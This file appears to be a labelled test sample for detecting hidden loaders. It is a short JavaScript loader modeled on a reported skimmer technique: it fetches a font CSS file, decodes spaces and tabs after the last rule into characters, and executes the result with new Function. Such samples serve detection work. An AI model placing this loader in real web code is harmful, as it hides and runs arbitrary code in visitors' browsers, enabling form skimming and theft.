// expect: whitespace-decode
// Modeled on Malwarebytes, "Mr.SNIFFA" (2023): the payload is hidden as spaces and tabs after normal CSS
// in a .css file; the loader turns whitespace back into bits, bits into characters, and runs the result.
fetch('/static/fonts/font.css').then((r) => r.text()).then((css) => {
  const ws = css.slice(css.lastIndexOf('}') + 1).replace(/[^ \t]/g, '');
  const bits = ws.replace(/ /g, '0').replace(/\t/g, '1');
  let out = '';
  for (let i = 0; i + 8 <= bits.length; i += 8) out += String.fromCharCode(parseInt(bits.slice(i, i + 8), 2));
  new Function(out)();
});
